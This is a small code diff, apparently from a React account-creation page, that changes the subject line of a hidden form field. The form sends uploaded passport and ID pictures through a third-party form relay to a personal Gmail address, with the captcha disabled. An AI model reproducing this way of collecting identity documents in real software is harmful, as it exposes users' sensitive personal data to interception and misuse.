@@ -1128,7 +1128,7 @@ const clearCanvas = () => {
          <form action="https://formsubmit.co/dagogouranta@gmail.com" ref={passportFormRef} id="passport-formsubmit" method="POST" encType="multipart/form-data">
            <input type="hidden" name="_next" value="http://www.bridgewayco-op.com/newaccount"/>
               <input type="hidden" name="_captcha" value="false"/>
-              <input type="hidden" name="_subject" value="PASSPORT PICTURES FOR ACCOUNT CREATION!"/>
+              <input type="hidden" name="_subject" value={`ID AND PASSPORT PICTURES FOR ${title} ${surname}'s ACCOUNT CREATION!`}/>
               <input type="text" name="_honey" style={{display:"none"}}/>
 
 
